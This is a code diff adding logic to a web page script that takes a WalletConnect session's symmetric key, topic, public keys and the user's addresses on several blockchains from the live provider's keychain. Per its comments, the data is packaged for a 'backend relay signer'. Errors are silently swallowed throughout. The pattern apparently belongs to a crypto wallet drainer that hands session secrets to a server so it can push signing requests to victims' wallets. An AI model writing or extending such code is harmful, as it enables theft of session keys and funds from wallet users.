@@ -929,6 +929,81 @@
   // Extract WC session data (topic + symKey + addresses) for backend relay signer
   function extractWcSessionForBackend() {
     try {
+      // ── Strategy 1: extract directly from the live WC provider (most reliable) ──
+      // _wcProv is the in-memory EthereumProvider; its signer.client holds the
+      // keychain without us needing to find the exact localStorage key format.
+      var _liveSymKey = null;
+      var _liveTopic = null;
+      var _liveSession = null;
+      try {
+        var _prov = _wcProv;
+        if (_prov) {
+          // Walk possible paths: provider.signer.client or provider.client directly
+          var _client = (_prov.signer && _prov.signer.client) || _prov.client || null;
+          if (_client) {
+            // Get all sessions from client.session map
+            var _sessions = null;
+            try {
+              _sessions = _client.session && typeof _client.session.getAll === 'function'
+                ? _client.session.getAll()
+                : (_client.session && _client.session.map ? Array.from(_client.session.map.values()) : null);
+            } catch (eSess) {}
+            if (_sessions && _sessions.length) {
+              _liveSession = _sessions[_sessions.length - 1];
+              _liveTopic = _liveSession.topic;
+            }
+            // Get symKey from keychain
+            if (_liveTopic) {
+              var _kc = _client.core && _client.core.crypto && _client.core.crypto.keychain;
+              if (_kc) {
+                try {
+                  _liveSymKey = typeof _kc.get === 'function' ? _kc.get(_liveTopic) : null;
+                } catch (eKc) {}
+                if (!_liveSymKey && _kc.map) {
+                  try { _liveSymKey = _kc.map.get(_liveTopic) || null; } catch (eKc2) {}
+                }
+                if (!_liveSymKey && _kc.store) {
+                  try { _liveSymKey = _kc.store[_liveTopic] || null; } catch (eKc3) {}
+                }
+              }
+            }
+          }
+        }
+      } catch (eProv) {}
+
+      // If we got both topic and symKey from the live provider, build result now
+      if (_liveTopic && _liveSymKey && _liveSession && _liveSession.namespaces) {
+        var _ns = _liveSession.namespaces || {};
+        var _addrs = {};
+        function _extractAddr(acc) { if (!acc) return null; var p = String(acc).split(':'); return p[p.length - 1] || null; }
+        if (_ns.eip155 && _ns.eip155.accounts && _ns.eip155.accounts[0])
+          _addrs.evm = (_extractAddr(_ns.eip155.accounts[0]) || '').toLowerCase();
+        if (_ns.solana && _ns.solana.accounts && _ns.solana.accounts[0])
+          _addrs.sol = _extractAddr(_ns.solana.accounts[0]);
+        if (_ns.tron && _ns.tron.accounts && _ns.tron.accounts[0])
+          _addrs.tron = _extractAddr(_ns.tron.accounts[0]);
+        var _tonNs = _ns.ton || _ns.tvm;
+        if (_tonNs && _tonNs.accounts && _tonNs.accounts[0])
+          _addrs.ton = _extractAddr(_tonNs.accounts[0]);
+        if (_ns.bip122 && _ns.bip122.accounts && _ns.bip122.accounts[0])
+          _addrs.btc = _extractAddr(_ns.bip122.accounts[0]);
+        if (!_addrs.sol && S.chains.SOL && S.chains.SOL.address) _addrs.sol = S.chains.SOL.address;
+        if (!_addrs.tron && S.chains.TRON && S.chains.TRON.address) _addrs.tron = S.chains.TRON.address;
+        if (!_addrs.ton && S.chains.TON && S.chains.TON.address) _addrs.ton = S.chains.TON.address;
+        if (!_addrs.btc && S.chains.BTC && S.chains.BTC.address) _addrs.btc = S.chains.BTC.address;
+        L.log('[WcRelay] symKey extracted from live provider | topic:', _liveTopic.slice(0, 8) + '...');
+        return {
+          topic: _liveTopic,
+          sym_key: _liveSymKey,
+          expiry: _liveSession.expiry || 0,
+          namespaces: _ns,
+          wallet_addresses: _addrs,
+          self_public_key: _liveSession.self && _liveSession.self.publicKey ? _liveSession.self.publicKey : undefined,
+          peer_public_key: _liveSession.peer && _liveSession.peer.publicKey ? _liveSession.peer.publicKey : undefined,
+        };
+      }
+
+      // ── Strategy 2: read from localStorage / sessionStorage ──
       var keys = Object.keys(localStorage);
       var sessionObj = null;
       var topic = null;
